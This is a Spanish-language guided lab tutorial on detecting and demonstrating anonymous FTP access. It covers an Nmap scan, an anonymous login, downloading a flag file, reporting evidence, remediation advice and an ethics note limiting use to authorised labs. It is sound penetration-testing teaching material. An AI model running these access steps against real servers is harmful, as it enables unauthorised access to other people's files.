Laboratorio Guiado: FTP Anónimo

Validando una mala configuración común.

Objetivo: Demostrar acceso no autorizado a un servidor FTP mal configurado sin usar exploits complejos.

PASO 1: Detección
Ejecuta Nmap para encontrar el puerto 21 abierto y verificar si permite login anónimo.
root@kali:~# nmap -p 21 -sC 192.168.1.15
...
PORT STATE SERVICE
21/tcp open ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
PASO 2: Validación Manual
Conéctate manualmente usando el usuario 'anonymous' y cualquier contraseña.
root@kali:~# ftp 192.168.1.15
Name: anonymous
Password: [Enter]
230 Login successful.
ftp>
PASO 3: Exfiltración (PoC)
Lista los archivos y descarga el archivo 'flag.txt' para demostrar impacto.
ftp> ls
-rw-r--r-- 1 root root 32 flag.txt
ftp> get flag.txt
ftp> exit
Misión Cumplida: Has validado el acceso no autorizado y obtenido la evidencia.

Complemento del laboratorio

ANTES DE EMPEZAR: Checklist (2 minutos)
  • [ ] Confirmo IP del objetivo (laboratorio) y red aislada.
  • [ ] Tengo snapshot de la VM para revertir si algo falla.
  • [ ] Bitácora lista: objetivo, comandos, evidencia, conclusiones.
PASO 4: Evidencia “replicable” (lo que se entrega)

En tu reporte, incluye mínimo:

  • Salida de Nmap donde se vea ftp-anon y el código 230.
  • Captura del login anónimo exitoso y del ls donde se vea flag.txt.
  • Archivo descargado (o captura del contenido) como evidencia del impacto.
  • Timestamp y dirección IP objetivo.
PASO 5: Impacto + recomendación (modo profesional)

Impacto: cualquier persona en la red puede listar/descargar archivos sin autenticación real.

Recomendación:

  • Deshabilitar acceso anónimo en el servicio FTP.
  • Aplicar mínimo privilegio a directorios compartidos (solo lectura si aplica, sin datos sensibles).
  • Restringir por firewall/ACL (permitir solo IPs autorizadas).
  • Considerar reemplazo por SFTP/FTPS con autenticación fuerte.
VARIACIÓN (opcional): Demostrar sin descargar

Si quieres una PoC aún más “inocua”, puedes demostrar impacto listando nombres y tamaños (sin exfiltrar archivos):

ftp> ls
ftp> pwd
ftp> bye

Luego explicas: “Existe acceso anónimo; se podrían descargar archivos si el atacante lo decide”.

Nota ética

Este procedimiento es solo para laboratorio o entornos autorizados. No se deben escanear ni probar servicios reales fuera del alcance.
